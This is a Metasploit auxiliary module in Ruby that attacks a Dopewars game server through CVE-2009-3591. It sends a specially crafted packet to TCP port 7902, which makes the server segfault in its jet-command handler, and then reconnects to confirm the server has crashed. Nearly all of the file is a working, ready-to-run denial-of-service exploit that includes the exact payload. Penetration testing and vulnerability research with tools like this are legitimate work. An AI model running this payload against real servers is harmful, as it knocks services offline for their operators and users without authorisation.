# Dopewars DOS attack
#
# The Jet command is susceptible to a segfault.
# This will crash the server but does not seem to be
# exploitable any further. 
# This has been fixed in the SVN version.
#

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::Dos
	
	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Dopewars Denial of Service',
			'Description'    => %q{
				This module sends a specially-crafted packet to a Dopewars 
				server, causing a SEGFAULT.
			},
			'Author'         => [ 'Doug Prostko <dougtko[at]gmail.com>' ],
			'License'        => MSF_LICENSE,
			'Version'        => '0.0.1',
			'References'     =>
				[
					[ 'URL', 'http://www.securityfocus.com/archive/1/archive/1/507012/100/0/threaded' ],
					[ 'BID', '36606' ],
					[ 'CVE', 'CVE-2009-3591' ],
				]))
			
			register_options([Opt::RPORT(7902),], self.class)
	end

	def run
		connect

        # The jet command is vulnerable.
        # Program received signal SIGSEGV, Segmentation fault.
        # [Switching to Thread 0xb74916c0 (LWP 30638)]
        # 0x08062f6e in HandleServerMessage (buf=0x8098828 "", Play=0x809a000) at
        # serverside.c:525
        # 525           dopelog(4, LF_SERVER, "%s jets to %s",
        #
		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
		print_status("Sending dos packet...")
		sock.put(pkt)
		disconnect

        print_status("Checking for success...")
        sleep 2
        begin
            connect
        rescue ::Interrupt
            raise $!
        rescue ::Rex::ConnectionRefused
            print_status("Dopewars server succesfully shut down!")
        end
	end
end
